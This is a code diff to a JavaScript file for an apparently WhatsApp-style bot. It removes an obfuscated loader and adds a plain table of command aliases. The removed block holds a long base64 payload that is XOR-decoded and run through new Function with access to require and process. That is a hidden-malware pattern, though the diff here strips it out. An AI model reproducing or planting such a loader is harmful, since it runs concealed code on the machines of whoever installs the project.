@@ -1,9 +1,19 @@
 'use strict';
-(function(){
-  const K=Buffer.from('REVDQU5YTUQtMjAyNg==','base64');
-  const D='YzAwJG4rOTZEUUQVDU5qaWtuHTUwX1MQXFcpIDBhKDc/ZE5dXV9XKiEwYTowKGRPXUQSVyg3JiAqIW0sTEEQGlorJCckKnghJV5GEF1YZDU2Mz43PiENQV8SUzIgMThuLCw2SldEElM8LDA1PXFjZAcdOl9ZIDAvJGA9NTRCQERBFnllazpuOSEtTEEcEkQhIioyOio0ZFAbEA8IZD5JYW47IipeRhBzFnllGEtueG1kdhVDRl8nLiYzaXRtY14VbR4WH2IzKSEsImMBEhdGWS0oJGYTdG0fCl9ABhFoZWQ1IS4kIEhdFx4WYzEsJic+ahkBEmsVWzR2ZG1ufyg8WUBRUUIlMCcoIX8QaA1pF0tCJWJvYWkhOSldARdvGmQeZDg6LmpoDRVJRls0cWQcYlJtZA0SaxVfKjY3IGl0bWNEXENGVyM3IixpBWFkdhVWUBFoZWQnLzsoJkJdWxVraGUYZjw1LyMKHhAVRCEoLDcrOipjcB4QaRE1N2Rtbn8/IUxWQUARGWljGmkxICMKHhAVXykkJCRpBWFkdhVDXVgjYm9haSghJVRWX1ERGWlJYW54bR8KQURTQjdib2FpMSMiQhUcEhEmKjdmYnhqN1RBRFdbY2ljZjwtIzBEX1UVa2hlGGY8PT0rCh4QFUQhNSwyJywiNlQVbR4WH2IpKCp/YWQKW1QVa2hlGGYiPSswCh4QFVohJDUkaQVhZHYVQEIRaGVkMissPTQKHhAVUSExMzFpBWFODRIQEm1jIikoKn9hZApVQl1DNDZkHGJ4FmNKW15UWWNpY2YpKiIxXVteVFljaWNmJzY7LVlXWVxQK2IebW4Dai1DRFlGU2NpY2YpKiIxXV5ZXF1jGG9hFX85JUpTVF9fKjZkbW5/OSVKU1RfXypiHm1EeG1kDWkXUVorNiZmYnhqKEJRW1VEKzAzZhN0bR8KXUBXWGNpY2Y7NiErTllXQFkxNWQcYngWY19XQ1dCY2ljZjw9PiFZRVFAWGNpY2YtNCglX0VRQFgtKyQyaQVhZHYVVltaMCAxZmJ4aiJEXkRXRDdiHm1EeG1kDWkXU1ooMyIzaXRtY15XREZfKiIwZmJ4aidCXFZbUWMYb2EVfzk2WRUcEhEwNyIvPTQsMEgVbR4WH2IwJDorLixIVkVeU2NpY2Y9OyUhSUdcVxEZaWMaaSwsN0YVHBIRMConLmkFYWR2FVFEW2NpY2Y4NyQnSBVtHjxkZWNhFX8pIUFXRFcRaGVkNCArKCpJFW0eFh9iJyAiNGpoDRVZX1cjLC0kaQVhZHYVVFdQLSsmZmJ4aiBEUURbWSokMThpBWFkdhVZQVkqYm9haTslIU5ZXkdbJiAxZhN0bR8KU0VGWTIsJjY9LCwwWEEXHhZjNjcgOi0+MkRXRxVraE9jYW54FmNMR0RdRCEkIDU9LCwwWEEXHhZjNjcgOi0+KERZVRVraGUYZi82OS1eQlFfEWhlZCAgLCQiQV1fVhEZaWMaaTkjMERVXRUaZGIiLzoxOSVKFW0eFh9iIi86MTorX1YXHhZjJC01JzosIFpdQlYRGWljGmktPSBMRlUVGmRiICkrOyYxXVZRRlNjGG9LbnhtZHYVUUFdY2ljZi8xahkBEmsVUi0mJmZieGo2Ql5cFWtoZRhmLTkhJwoeEBVTMiQvZhNSbWRwCToSFiIqMWFmOyIqXkYQaUIlNyQkOnRtagMcXlNbITYeYSE+bQUEEks4FmRlYyIhNj4wDVRCV0UsZX5hIDkgIV4cVltaMCAxaSB4cHoNE0JXUS02NzM3diUlXhpeGx9/T2NhbngkIg0aQldRLTY3Mzd2JSVeGkRTRCMgN2hufmtkS0BVQV5qKSYvKSwlbQ1TXFtXN203IDw/KDABEh4cGCI3JjImcXZODRJNOEt/Tw==';
-  const X=Buffer.from(D,'base64');
-  for(let i=0;i<X.length;i++) X[i]^=K[i%K.length];
-  const C=X.toString('utf8');
-  return (new Function('require','module','exports','__filename','__dirname','process','Buffer',C))(require,module,exports,__filename,__dirname,process,Buffer);
-})();
+/** Extra names for commands the bot already has (loaded last on purpose so every target exists). */
+module.exports = ({ alias, registry }) => {
+  const A = [
+    ['sticker', 's'], ['photo', 'toimg'], ['mp4', 'tovideo', 'togif'], ['mp3', 'extractaudio'], ['yta', 'ytmp3'], ['ytv', 'ytmp4'],
+    ['insta', 'instagram'], ['fb', 'facebook'], ['rmbg', 'removebg'], ['qr', 'readqr'], ['img', 'image'], ['song', 'playdoc'],
+    ['stats', 'info', 'bot', 'system', 'runtime'], ['repo', 'repository'], ['jid', 'id'], ['left', 'leave'], ['pp', 'setpp', 'getpp'],
+    ['gjid', 'groups'], ['ginfo', 'groupinfo', 'inviteinfo'], ['invite', 'grouplink'], ['tagadmins', 'tagadmin'],
+    ['close', 'lockgroup'], ['open', 'unlockgroup'], ['reset', 'resetwarn', 'clearwarnings'], ['filter', 'filters'],
+    ['allvar', 'settings', 'config'], ['trt', 'translate'], ['setschedule', 'schedule'], ['task', 'todo'], ['avm', 'voice'],
+    ['delete', 'unsend'], ['dall', 'imagine'], ['define', 'dictionary'], ['ison', 'checknumber'], ['autoviewstatus', 'statusview'],
+    ['autoreactstatus', 'statuslike'], ['antispam', 'antiflood'], ['antigm', 'antitag'], ['antiword', 'antibadword'], ['update', 'checkupdate'],
+    ['ask', 'ai'], ['dice', 'roll'], ['calc', 'eval']
+  ];
+  for (const [target, ...names] of A) {
+    const fresh = names.filter(n => !registry.has(n));
+    if (registry.has(target) && fresh.length) alias(target, ...fresh);
+  }
+};
